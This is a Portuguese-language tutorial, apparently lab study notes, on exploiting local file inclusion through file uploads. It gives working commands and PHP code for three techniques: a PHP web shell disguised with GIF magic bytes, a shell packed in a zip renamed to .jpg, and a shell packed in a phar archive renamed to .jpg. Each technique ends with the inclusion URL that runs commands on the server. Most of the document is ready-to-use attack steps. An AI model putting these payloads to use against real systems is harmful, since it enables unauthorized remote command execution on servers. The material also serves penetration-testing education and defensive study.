Métodos de Exploração de LFI com Upload de Arquivos: Explicações Detalhadas
1. Inclusão de Arquivo com Imagem Maliciosa
Criação da Imagem Maliciosa
Objetivo: Disfarçar código malicioso em um arquivo de imagem para contornar verificações de tipo de arquivo.
Como funciona: Arquivos de imagem geralmente são permitidos em uploads. Ao iniciar o arquivo com bytes mágicos de imagem (ex: GIF8 para GIFs) e inserir código PHP malicioso, podemos enganar o sistema para aceitar o upload.
Exemplo:
sh
Copiar código
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
Upload da Imagem
Passos:
Navegar até a página de configurações de perfil do aplicativo.
Fazer upload da imagem maliciosa (shell.gif).
Por que funciona: O sistema de upload verifica a extensão e os bytes mágicos, mas não o conteúdo completo do arquivo.
Inclusão do Arquivo Carregado
Obtenção do caminho do arquivo:
Após o upload, inspecione o código fonte da página para encontrar a URL do arquivo. Exemplo:
html
Copiar código
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
Uso da vulnerabilidade LFI:
A URL do arquivo é usada para incluir e executar o código PHP embutido:
sh
Copiar código
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
Resultado: O código PHP no arquivo é executado no servidor, permitindo a execução remota de comandos.
2. Uso do Wrapper Zip
Criação do Arquivo Zip
Objetivo: Esconder um script PHP malicioso dentro de um arquivo zip e renomeá-lo para uma extensão permitida (ex: .jpg).
Como funciona: Arquivos zip podem conter qualquer tipo de arquivo. Ao renomeá-lo para .jpg, tentamos contornar verificações de tipo de arquivo.
Exemplo:
sh
Copiar código
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
Upload do Arquivo Zip
Passos:
Navegar até a página de configurações de perfil.
Fazer upload do arquivo shell.jpg.
Por que funciona: Alguns sistemas permitem arquivos zip, mas não verificam adequadamente o conteúdo após a renomeação.
Inclusão do Arquivo Zip
Uso da vulnerabilidade LFI com wrapper zip:
sh
Copiar código
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
Resultado: O código PHP dentro do arquivo zip é executado.
3. Uso do Wrapper Phar
Criação do Arquivo Phar
Objetivo: Esconder um script PHP malicioso dentro de um arquivo phar e renomeá-lo para uma extensão permitida (ex: .jpg).
Como funciona: Arquivos phar podem embutir arquivos PHP. Ao renomeá-lo, tentamos contornar verificações de tipo de arquivo.
Exemplo:
php
Copiar código
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
?>
Compilação e renomeação:
sh
Copiar código
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
Upload do Arquivo Phar
Passos:
Navegar até a página de configurações de perfil.
Fazer upload do arquivo shell.jpg.
Por que funciona: Alguns sistemas permitem arquivos phar, mas não verificam adequadamente o conteúdo após a renomeação.
Inclusão do Arquivo Phar
Uso da vulnerabilidade LFI com wrapper phar:
sh
Copiar código
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
Resultado: O código PHP dentro do subarquivo phar é executado.
Conclusão
Cada método explora a funcionalidade de upload de arquivos para armazenar código malicioso no servidor, que é então executado através de uma vulnerabilidade LFI. A escolha do método depende das permissões de upload do servidor e das configurações de segurança.

Método da imagem maliciosa: mais simples e direto, utiliza imagens comuns.
Wrapper zip: útil quando arquivos zip são permitidos, mas requerem renomeação.
Wrapper phar: uma alternativa quando outros métodos falham, aproveitando a capacidade de arquivos phar embutirem scripts PHP.
